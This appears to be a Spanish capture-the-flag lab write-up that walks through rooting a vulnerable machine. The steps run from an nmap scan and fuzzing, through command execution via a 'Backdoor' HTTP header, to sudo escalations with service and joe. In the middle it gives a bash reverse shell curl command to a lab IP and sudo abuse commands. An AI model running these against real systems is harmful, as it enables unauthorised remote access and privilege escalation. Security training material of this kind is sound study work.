Hacemos el escaneo de nmap:
![[Pasted image 20240201102552.png]]
Y esto es lo que corre por el puerto 80:
![[Pasted image 20240201102710.png]]
Si hacemos fuzzing web por extensiones de archivos, nos encontramos con un admin.php:
![[Pasted image 20240201102809.png]]
Y dentro de este archivo vemos un apartado llamado loaded modules que nos llama la atención que dice mod_backdoor:
![[Pasted image 20240201103505.png]]
Investigamos por google y nos encontramos este repositorio de github:
![[Pasted image 20240201103957.png]]
Y en este exploit vemos que lo que hace es hacer una petición con requests utilizando la cabecera Backdoor:
![[Pasted image 20240201104203.png]]
Podemos hacer esto mismo con curl de la siguiente forma:
```bash
curl -H 'Backdoor: whoami' "192.168.0.67"
```
![[Pasted image 20240201105114.png]]
Y ejecutamos la reverse shell:
```bash
curl -H 'Backdoor: bash -c "bash -i >& /dev/tcp/192.168.0.56/443 0>&1"' "192.168.0.67"
```
![[Pasted image 20240201110142.png]]
Con el comando sudo -l nos encontramos con el binario service que lo podemos ejecutar como el usuarios laurent:
![[Pasted image 20240201110510.png]]
Y en gtfobins vemos las siguientes instrucciones sobre el binario service:
![[Pasted image 20240201110720.png]]
Lo ejecutamos:
```bash
sudo -u laurent /usr/sbin/service ../../bin/bash
```
![[Pasted image 20240201110740.png]]
Y vemos otra vez que como root ahora podemos ejecutar el binario joe:
![[Pasted image 20240201110819.png]]
Tenemos estas instrucciones en gtfobins:
![[Pasted image 20240201110834.png]]
Una vez ejecutado esto, pulsamos control K y podremos escribir lo siguiente:
![[Pasted image 20240201111217.png]]
Y ya somos root:
![[Pasted image 20240201111228.png]]
